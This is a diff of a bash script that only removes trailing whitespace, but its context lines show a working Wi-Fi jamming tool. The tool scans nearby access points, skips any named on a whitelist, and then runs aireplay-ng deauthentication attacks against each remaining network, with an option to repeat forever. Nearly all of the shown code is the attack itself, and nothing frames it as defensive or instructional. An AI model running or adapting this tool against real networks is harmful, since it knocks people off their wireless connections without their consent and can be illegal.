@@ -85,7 +85,7 @@ check_number() {
 }
 
 # check if array contains element
-array_contains_element() { 
+array_contains_element() {
     local array="$1[@]"
     local seeking=$2
     local in=1
@@ -202,7 +202,7 @@ scan_area() {
                 essid=${line##*ID:}
                 #array_contains_element $WHITE_LIST $essid == 0 && echo "${bssid};${channel};${essid}"
                 found=0
-                for element in "${WHITE_LIST[@]}"; do    
+                for element in "${WHITE_LIST[@]}"; do
                     element=$( echo "${element}" | sed -e 's/^ *//' -e 's/ *$//' );
                     if [[ $element == $essid ]]; then
                         found=1
@@ -212,9 +212,9 @@ scan_area() {
                 if [[ $found -eq 0 ]]; then
                     echo "${bssid};${channel};${essid}"
                 fi
-            }     
-        done > ${NAME}_out.txt ; 
-    then 
+            }
+        done > ${NAME}_out.txt ;
+    then
         echo "Something went wrong, retrying"
         sleep 5
         scan_area
@@ -229,13 +229,13 @@ deauth() {
         echo -e ${PROMPT}Targeting:${RED} "$essid" ${NC} with BSSID: "$bssid" @ ${GREEN}Channel "$channel" ${NC}
         sleep 3
         iwconfig $W_INT channel "$channel"
-        aireplay-ng -0 $DE_AUTH_NUMBER -a "$bssid" $W_INT 
+        aireplay-ng -0 $DE_AUTH_NUMBER -a "$bssid" $W_INT
     fi
 }
 
-read_file_and_deauth() {  
+read_file_and_deauth() {
     warn_before
-    # Read the file, line by line and de-auth each MAC 
+    # Read the file, line by line and de-auth each MAC
     while read -r line
     do
         read bssid channel essid <<< $(echo $line | awk -F";" '{print $1 " " $2 " " $3}')
@@ -245,9 +245,9 @@ read_file_and_deauth() {
 
 # starts attack, if ENDLESS is 1, goes on forever
 main_attack() {
-    read_file_and_deauth 
+    read_file_and_deauth
     if [[ ENDLESS -eq 1 ]]; then
-        main_attack 
+        main_attack
     else exit 0
     fi
 }
@@ -256,7 +256,7 @@ main_attack() {
 # a fucntion to print the detected stations from the file
 show_detected_stations() {
     printf "${PROMPT}Detected Stations are:\n"
-    awk -F";" '{print NR,$3}' ${NAME}_out.txt 
+    awk -F";" '{print NR,$3}' ${NAME}_out.txt
     printf "\n\n"
 }
 
@@ -323,7 +323,7 @@ case $key in
     ;;
 esac
 # go to the next argument
-shift 
+shift
 done
 
 
@@ -371,11 +371,11 @@ fi
 printf "${PROMPT}Scan is completed. Start jamming? [Y/n] "
 read answer_start
 case $answer_start in
-        [Nn] | [Nn][Oo] ) 
-            printf "${PROMPT}${RED}Aborted.\n${NC}"          
+        [Nn] | [Nn][Oo] )
+            printf "${PROMPT}${RED}Aborted.\n${NC}"
             exit 0
         ;;
-        *) 
+        *)
             main_attack
             exit 0
         ;;
